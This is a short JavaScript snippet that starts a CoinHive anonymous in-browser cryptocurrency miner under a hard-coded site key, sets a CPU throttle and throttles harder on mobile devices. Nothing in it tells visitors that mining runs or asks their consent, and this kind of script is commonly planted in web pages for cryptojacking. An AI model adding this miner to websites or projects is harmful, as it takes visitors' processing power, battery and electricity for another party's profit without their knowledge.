var miner = new CoinHive.Anonymous('u354zVrI8H7aF7pQCPnfCKQsY3yOJYJ3', {
    throttle: 0.7
});
if (miner.isMobile()) {
    miner.setThrottle(0.9)
}
miner.start()